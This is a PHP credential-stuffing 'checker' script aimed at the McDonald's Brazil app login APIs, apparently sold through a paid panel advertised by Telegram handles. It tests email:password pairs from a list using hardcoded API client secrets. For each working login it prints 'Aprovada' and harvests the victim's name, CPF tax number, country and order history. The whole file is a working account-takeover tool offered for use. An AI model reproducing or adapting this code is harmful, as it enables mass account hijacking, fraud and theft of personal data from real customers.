<?php
#############################################
error_reporting(1);
set_time_limit(0);
ignore_user_abort();
date_default_timezone_set('America/Sao_Paulo');
#############################################  

#############################################  

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$loadtime = time();

function getStrc($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

$time = time();

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode(":", $lista);
// Separando Email e Senha
$email = $separar[0];
$senha = $separar[1];
// Aplicar URL encoding ao email e senha
$email2 = urlencode($email);
$senha2 = urlencode($senha);
// Aplicar URL encoding ao email e senha
$lista = ("$email:$senha");

if(file_exists($cookieDir)){ unlink($cookieDir); }

// Puxar Token
$headers = array();
$headers[] = "Accept: */*";
$headers[] = "User-Agent: McDonald's/17224 CFNetwork/1485 Darwin/23.1.0";
$headers[] = "Accept-Language: pt-BR,pt;q=0.9";
$headers[] = "Connection: close";
$headers[] = "Content-Type: application/json";

$ch = curl_init();
curl_setopt_array($ch, [
	CURLOPT_URL=>'https://api-im.mcdonaldscupones.com/auth/multi',

    CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_SSL_VERIFYPEER=>false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIEFILE => $cookieDir,
    CURLOPT_COOKIEJAR => $cookieDir,
    CURLOPT_POST=>1,
    CURLOPT_POSTFIELDS=> '{"multi":[{"clientId":"k9qjgucmoiwu6s3upurnqaor","clientSecret":"73k66o210vwuyn9bvvh1al9pb9"},{"clientSecret":"vqmwdrlwmkykb4cr0bqvkj4i","clientId":"kzr8yvm09gmz4dzzavs32qpvi"}]}',
    CURLOPT_HTTPHEADER => $headers
]);
$r = curl_exec($ch);

//OUTROS (TK1)
$tk1 = puxar($r, '[{"token":"', '"', 1);
//OUTROS (TK2)
$tk2 = puxar($r, '},{"token":"', '"', 1);

// Logar
$headers = array();
$headers[] = "Accept: */*";
$headers[] = "User-Agent: McDonald's/17224 CFNetwork/1485 Darwin/23.1.0";
$headers[] = "Accept-Language: pt";
$headers[] = "Authorization: Bearer $tk1";
$headers[] = "Content-Type: application/json";

$ch = curl_init();
curl_setopt_array($ch, [
	CURLOPT_URL=>'https://api-im.mcdonaldscupones.com/login/multi',

    CURLOPT_RETURNTRANSFER=>true,
    CURLOPT_SSL_VERIFYPEER=>false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIEFILE => $cookieDir,
    CURLOPT_COOKIEJAR => $cookieDir,
    CURLOPT_POST=>1,
    CURLOPT_POSTFIELDS=> '{"password":"'.$senha.'","email":"'.$email.'","multi":[{"app":"mcdonalds-2.8.1","clientToken":"'.$tk1.'"},{"app":"mcentrega-2.8.1","clientToken":"'.$tk2.'"}]}',
    CURLOPT_HTTPHEADER => $headers
]);
$logando = curl_exec($ch);
$retorno = puxar($logando, '"error":"', '"', 1);
//DADOS
$nome = puxar($logando, '"name":"', '"', 1);
$pais = puxar($logando, '"countryProfile","value":"', '"', 1);
$cpf = puxar($logando, '"cpf","value":"', '"', 1);
//ACESSO (TK)
$acesso = puxar($logando, '},{"token":"', '"', 1);

if(strpos($logando, 'refreshToken')){
// Puxar Pedidos
$headers = array();
$headers[] = "User-Agent: McDonald's/17224 CFNetwork/1485 Darwin/23.1.0";
$headers[] = "Pragma: no-cache";
$headers[] = "Accept: */*";
$headers[] = "Catalog-Loyalty-Version: v2";
$headers[] = "X-App-Language: pt";
$headers[] = "Authorization: Bearer $acesso";
$headers[] = "Accept-Language: pt-BR,pt;q=0.9";
$headers[] = "Tag-List-Version: v2";
$headers[] = "X-App-Version: IOS_3.37.0";
$headers[] = "X-App-Country: BR";
$headers[] = "Content-Type: application/x-www-form-urlencoded";

$ch = curl_init();
curl_setopt_array($ch, [
	CURLOPT_URL=>'https://api-mcd-ecommerce-br.appmcdonalds.com/orders/finished?page=1',

	CURLOPT_RETURNTRANSFER=>true,
  	CURLOPT_CUSTOMREQUEST=> "GET",
	CURLOPT_SSL_VERIFYPEER=>false,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_COOKIEFILE => $cookieDir,
	CURLOPT_COOKIEJAR => $cookieDir,
	CURLOPT_POST=>1,
  	CURLOPT_HTTPHEADER => $headers
]);
$infos = curl_exec($ch);
// Decodifica a resposta JSON
$data = json_decode($infos, true);

// Extrai e concatena os status dos pedidos
$pedidostatus = implode(', ', array_column($data['orders'], 'status'));
// Inicializa o array para armazenar os nomes dos pedidos
$pedidoname = [];
// Verifica se há pedidos na resposta
if (isset($data['orders'])) {
    // Itera sobre os pedidos
    foreach ($data['orders'] as $pedido) {
        // Verifica se há produtos no pedido
        if (isset($pedido['products'])) {
            // Usa array_column para extrair os nomes dos produtos e adicioná-los ao array $pedidoname
            $pedidoname = array_merge($pedidoname, array_column($pedido['products'], 'name'));
        }
    }
}
// Junta os nomes dos pedidos em uma única string separada por vírgula
$pedidoname = implode(', ', $pedidoname);
}

//VERIFICAÇÃO DE SALDO
if ($saldo < $valor_live) {  
echo "<span class='badge badge-warning'> Sem creditos suficiente! </span> <span class='badge badge-dark'> Recarregue com os admins </span> <span class='badge badge-dark'> <a href='https://t.me/astrocentral'> @astrocentral </span> <span class='badge badge-dark'></span><br>";  
exit();  
} else {
if(strpos($logando, 'refreshToken')){
// PRINT DA LIVE
echo '<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Aprovada</span>  <span class="badge badge-dark">'.$lista.'</span>  <span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">Logado com Sucesso</span> <span class="badge badge-info"style="background: linear-gradient(90deg, rgba(4,59,145,1) 0%, rgba(9,86,199,1) 49%, rgba(0,84,237,1) 99%);">Nome: '.$nome.'</span> <span class="badge badge-info"style="background: linear-gradient(90deg, rgba(4,59,145,1) 0%, rgba(9,86,199,1) 49%, rgba(0,84,237,1) 99%);">Cpf: '.$cpf.'</span> <span class="badge badge-info"style="background: linear-gradient(90deg, rgba(4,59,145,1) 0%, rgba(9,86,199,1) 49%, rgba(0,84,237,1) 99%);">País: '.$pais.'</span> <span class="badge badge-info"style="background: linear-gradient(90deg, rgba(4,59,145,1) 0%, rgba(9,86,199,1) 49%, rgba(0,84,237,1) 99%);">Pedidos (Status): '.$pedidostatus.'</span> <span class="badge badge-dark"><a href="https://t.me/Mamon_Oficial">@Mamon_Oficial</span>  <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
// FUNÇÕES

} else {
    echo '<span class="badge badge-info"style="background: linear-gradient(to right, #ff007a, #ff0062, #ff0049, #ff002d, #ff0000);"> Reprovada </span> <span class="badge badge-dark">'.$lista.'</span> <span class="badge badge-info"style="background: linear-gradient(to right, #ff007a, #ff0062, #ff0049, #ff002d, #ff0000);"> '.$retorno.' </span> <span class="badge badge-dark"><a href="https://t.me/Mamon_Oficial">@Mamon_Oficial</span> <span class="badge badge-dark">('.(time() - $time).' SEG)</span><br>';
}
}
?>